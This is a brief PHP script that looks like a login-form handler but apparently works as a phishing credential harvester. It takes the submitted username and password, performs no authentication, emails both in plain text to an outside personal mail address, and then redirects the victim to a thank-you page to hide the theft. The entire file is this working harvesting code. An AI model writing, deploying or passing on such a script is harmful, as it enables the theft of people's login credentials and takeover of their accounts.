<?php
// Set the recipient email address
$to_email = "fuzelxr@gmail.com";

// Get the form data
$username = $_POST["username"];
$password = $_POST["password"];

// Compose the email message
$message = "Username: $username\nPassword: $password";

// Set the email headers
$headers = "From: noreply@example.com";

// Send the email
mail($to_email, "Login Form Submission", $message, $headers);

// Redirect the user to a thank you page
header("Location: thankyou.html");
exit;
?>
